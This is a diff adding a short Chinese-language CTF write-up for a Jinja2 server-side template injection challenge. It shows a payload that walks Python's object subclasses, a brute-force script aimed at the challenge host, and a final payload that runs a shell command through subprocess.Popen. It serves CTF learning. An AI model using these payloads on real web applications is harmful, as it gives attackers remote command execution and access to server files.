@@ -2405,6 +2405,39 @@ $e = serialize($e);
 echo base64_encode($e);
 ```
 
+## 攻防世界 Web_python_template_injection
+
+考点是Python jinjia2 的模板注入，一开始找了一下没发现注入点，偷瞄了一下才知道原来是直接在URL后面加
+
+先拿到基类`object`，在查找下面的子类
+
+```
+{{''.__class__.__mro__[2].__subclasses__()}}
+```
+
+直接使用`Ctrl+f`查找，寻找可利用的模块，最后发现一个可利用的模块：`<class 'subprocess.Popen'>`，这里提供Python代码来寻找
+
+```py
+import requests
+
+base_url = "http://61.147.171.105:57186/"
+for i in range(500):
+    payload = "{{''.__class__.__mro__[2].__subclasses__()[" + str(i) + "]}}"
+    res = requests.get(base_url + payload).text
+    # print(res)
+    if "subprocess" in res:
+        print("发现索引：", i, "payload：", payload)
+
+```
+
+最后payload
+
+```
+{{''.__class__.__mro__[2].__subclasses__()[237]('cat fl4g',shell=True,stdout=-1).communicate()[0].strip()}}
+```
+
+![image-20230902220848461](CTF.assets/image-20230902220848461.png)
+
 
 
 # Misc
